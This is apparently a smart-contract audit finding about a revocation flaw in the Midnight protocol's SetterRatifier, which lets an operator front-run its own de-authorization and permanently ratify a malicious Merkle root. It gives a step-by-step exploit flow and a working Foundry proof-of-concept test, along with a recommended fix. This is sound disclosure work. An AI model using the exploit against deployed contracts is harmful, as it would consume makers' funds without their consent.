### Title
Operator front-runs authorization revocation to permanently ratify a malicious root in SetterRatifier - (File: src/ratifiers/SetterRatifier.sol)

### Summary
`SetterRatifier.setIsRootRatified` checks authorization only at call time and writes persistent state (`isRootRatified[maker][root] = true`) that is never invalidated when the maker later revokes the operator's authorization. Unlike `EcrecoverRatifier`, which re-checks `isAuthorized` at every `isRatified` call, `SetterRatifier.isRatified` only reads the stored boolean, so a root ratified by a now-revoked operator remains permanently active. An operator who sees a revocation in the mempool can front-run it to ratify a malicious Merkle root, enabling takes against that root to succeed indefinitely after the maker believed they had cut off the operator's access.

### Finding Description
**Code path and root cause**

`SetterRatifier.setIsRootRatified` (line 24–28):
```solidity
function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    isRootRatified[maker][root] = newIsRootRatified;   // persistent write
    ...
}
``` [1](#0-0) 

`SetterRatifier.isRatified` (line 30–36) — called by `Midnight` during every `take`:
```solidity
function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
    require(msg.sender == MIDNIGHT, NotMidnight());
    ...
    require(isRootRatified[offer.maker][root], NotRatified());  // NO authorization re-check
    return CALLBACK_SUCCESS;
}
``` [2](#0-1) 

`Midnight.setIsAuthorized` only writes to `isAuthorized`; it has no knowledge of, and makes no changes to, `SetterRatifier.isRootRatified`: [3](#0-2) 

**Contrast with `EcrecoverRatifier`**, which re-checks `IMidnight(MIDNIGHT).isAuthorized(offer.maker, _signer)` inside `isRatified` at every take, so revocation immediately blocks future takes. The existing test `testIsRatifiedRevokeAuthorizationInvalidates` (line 185–205) explicitly verifies this property for `EcrecoverRatifier` but no equivalent exists for `SetterRatifier`. [4](#0-3) 

**Exploit flow**

1. Maker grants operator authorization: `midnight.setIsAuthorized(operator, true, maker)` → `isAuthorized[maker][operator] = true`.
2. Maker decides to revoke and broadcasts `midnight.setIsAuthorized(operator, false, maker)`.
3. Operator observes the pending revocation in the mempool and front-runs it with `setterRatifier.setIsRootRatified(maker, maliciousRoot, true)`. Authorization check passes (operator is still authorized at this point). `isRootRatified[maker][maliciousRoot]` is set to `true`.
4. Maker's revocation mines: `isAuthorized[maker][operator] = false`.
5. `isRootRatified[maker][maliciousRoot]` remains `true` — it is never touched by `setIsAuthorized`.
6. Operator (or any colluding party) calls `midnight.take(maliciousOffer, abi.encode(maliciousRoot, leafIndex, proof), ...)`. `SetterRatifier.isRatified` returns `CALLBACK_SUCCESS` because `isRootRatified[maker][maliciousRoot]` is still `true`. The take executes against the maker's position.

**Why existing checks fail**

The authorization guard in `setIsRootRatified` is a gate on the write, not on the read. Once the write has occurred, `isRatified` has no mechanism to detect that the writer's authorization was subsequently revoked. The maker has no way to enumerate which roots the operator ratified without scanning all `SetIsRootRatified` events, and the malicious root can be used for takes at any future time. [5](#0-4) 

### Impact Explanation
After the maker's revocation is mined, `isRootRatified[maker][maliciousRoot]` remains `true`. Any `take` call that supplies a valid Merkle proof against `maliciousRoot` will pass `SetterRatifier.isRatified` and execute against the maker's position — draining credit, consuming offer capacity, or creating debt — without the maker's current consent and contrary to their explicit revocation. The maker cannot prevent this without knowing the exact root value and calling `setIsRootRatified(maker, maliciousRoot, false)` themselves.

### Likelihood Explanation
**Preconditions**: The operator must have been authorized at some point (a normal, intended use case). The operator must observe the revocation transaction in the mempool before it is mined (standard mempool visibility on Ethereum). **Feasibility**: Front-running is routine on Ethereum; the operator simply submits `setIsRootRatified` with a higher gas price. **Repeatability**: The operator can ratify multiple malicious roots in a single block before the revocation lands. The attack is not limited to a race condition — any operator who was ever authorized and called `setIsRootRatified` with a malicious root at any prior time achieves the same persistent impact without any front-running.

### Recommendation
Re-check authorization inside `isRatified` at take-time, analogous to `EcrecoverRatifier`. One approach: store not just the boolean but also the address that ratified each root, then verify in `isRatified` that the ratifier is still authorized:

```solidity
mapping(address maker => mapping(bytes32 root => address ratifier)) public rootRatifier;

function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
    require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
    rootRatifier[maker][root] = newIsRootRatified ? msg.sender : address(0);
    ...
}

function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
    require(msg.sender == MIDNIGHT, NotMidnight());
    ...
    address ratifier = rootRatifier[offer.maker][root];
    require(ratifier != address(0), NotRatified());
    require(
        ratifier == offer.maker || IMidnight(MIDNIGHT).isAuthorized(offer.maker, ratifier),
        Unauthorized()
    );
    return CALLBACK_SUCCESS;
}
```

This ensures that revoking an operator's authorization immediately invalidates all roots that operator ratified, matching the behavior of `EcrecoverRatifier` and satisfying the invariant that revocation immediately prevents all authorized actions.

### Proof of Concept
```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {BaseTest} from "./BaseTest.sol";
import {SetterRatifier} from "../src/ratifiers/SetterRatifier.sol";
import {HashLib} from "../src/ratifiers/libraries/HashLib.sol";
import {Offer, CollateralParams, Market} from "../src/interfaces/IMidnight.sol";
import {MAX_TICK} from "../src/libraries/TickLib.sol";

contract SetterRatifierFrontRunTest is BaseTest {
    SetterRatifier internal setterRatifier;

    function setUp() public override {
        super.setUp();
        setterRatifier = new SetterRatifier(address(midnight));
    }

    function testFrontRunRevocationRatifiesMaliciousRoot() public {
        // Build a malicious offer (operator-controlled terms)
        Offer memory maliciousOffer;
        maliciousOffer.buy = true;
        maliciousOffer.maker = lender;
        maliciousOffer.ratifier = address(setterRatifier);
        maliciousOffer.maxUnits = type(uint256).max;
        maliciousOffer.tick = MAX_TICK;
        maliciousOffer.expiry = block.timestamp + 365 days;
        Market memory market;
        market.loanToken = address(loanToken);
        market.maturity = block.timestamp + 100;
        market.collateralParams = new CollateralParams[](1);
        market.collateralParams[0] = CollateralParams({
            token: address(collateralToken1), lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18), oracle: address(oracle1)
        });
        maliciousOffer.market = market;
        bytes32 maliciousRoot = HashLib.hashOffer(maliciousOffer);

        // Step 1: maker authorizes operator
        vm.prank(lender);
        midnight.setIsAuthorized(address(setterRatifier), true, lender);
        vm.prank(lender);
        midnight.setIsAuthorized(borrower, true, lender);  // borrower = operator

        // Step 2: maker submits revocation (pending in mempool)
        // Step 3: operator front-runs — ratifies malicious root BEFORE revocation mines
        vm.prank(borrower);  // operator front-runs
        setterRatifier.setIsRootRatified(lender, maliciousRoot, true);

        // Step 4: maker's revocation mines
        vm.prank(lender);
        midnight.setIsAuthorized(borrower, false, lender);

        // Assert: operator is no longer authorized
        assertFalse(midnight.isAuthorized(lender, borrower));

        // Assert: but malicious root is STILL ratified — revocation had no effect
        assertTrue(setterRatifier.isRootRatified(lender, maliciousRoot));

        // Step 5: take against malicious root succeeds post-revocation
        uint256 units = 1000;
        deal(address(loanToken), lender, units);
        collateralize(market, borrower, units);

        // This take should revert if revocation were effective, but it succeeds
        vm.prank(borrower);
        midnight.take(
            maliciousOffer,
            abi.encode(maliciousRoot, 0, new bytes32[](0)),
            units,
            borrower,
            borrower,
            address(0),
            hex""
        );

        // Maker's position was consumed without current consent
        assertGt(midnight.debtOf(toId(market), borrower), 0);
    }
}
```

**Expected assertions**:
- `assertFalse(midnight.isAuthorized(lender, borrower))` — revocation succeeded
- `assertTrue(setterRatifier.isRootRatified(lender, maliciousRoot))` — root persists despite revocation (the bug)
- `take` completes without revert — malicious offer executes post-revocation (the impact)
- With the fix applied, `isRatified` would revert with `Unauthorized()` because `borrower` is no longer authorized, and the `take` would revert

### Citations

**File:** src/ratifiers/SetterRatifier.sol (L18-18)
```text
    mapping(address maker => mapping(bytes32 root => bool)) public isRootRatified;
```

**File:** src/ratifiers/SetterRatifier.sol (L24-28)
```text
    function setIsRootRatified(address maker, bytes32 root, bool newIsRootRatified) public {
        require(maker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(maker, msg.sender), Unauthorized());
        isRootRatified[maker][root] = newIsRootRatified;
        emit SetIsRootRatified(msg.sender, maker, root, newIsRootRatified);
    }
```

**File:** src/ratifiers/SetterRatifier.sol (L30-36)
```text
    function isRatified(Offer memory offer, bytes memory ratifierData) external view returns (bytes32) {
        require(msg.sender == MIDNIGHT, NotMidnight());
        (bytes32 root, uint256 leafIndex, bytes32[] memory proof) =
            abi.decode(ratifierData, (bytes32, uint256, bytes32[]));
        require(HashLib.isLeaf(root, HashLib.hashOffer(offer), leafIndex, proof), InvalidProof());
        require(isRootRatified[offer.maker][root], NotRatified());
        return CALLBACK_SUCCESS;
```

**File:** src/Midnight.sol (L731-735)
```text
    function setIsAuthorized(address authorized, bool newIsAuthorized, address onBehalf) external {
        require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
        isAuthorized[onBehalf][authorized] = newIsAuthorized;
        emit EventsLib.SetIsAuthorized(msg.sender, authorized, newIsAuthorized, onBehalf);
    }
```

**File:** test/EcrecoverRatifierTest.sol (L185-205)
```text
    function testIsRatifiedRevokeAuthorizationInvalidates() public {
        Offer memory offer = makeOffer(lender);
        bytes32 _root = HashLib.hashOffer(offer);

        vm.prank(lender);

        midnight.setIsAuthorized(borrower, true, lender);
        bytes memory ratifierData = buildRatifierData(_root, borrower);

        // Works while authorized.
        vm.prank(address(midnight));
        ecrecoverRatifier.isRatified(offer, ratifierData);

        // Revoke.
        vm.prank(lender);
        midnight.setIsAuthorized(borrower, false, lender);

        vm.prank(address(midnight));
        vm.expectRevert(IEcrecoverRatifier.Unauthorized.selector);
        ecrecoverRatifier.isRatified(offer, ratifierData);
    }
```
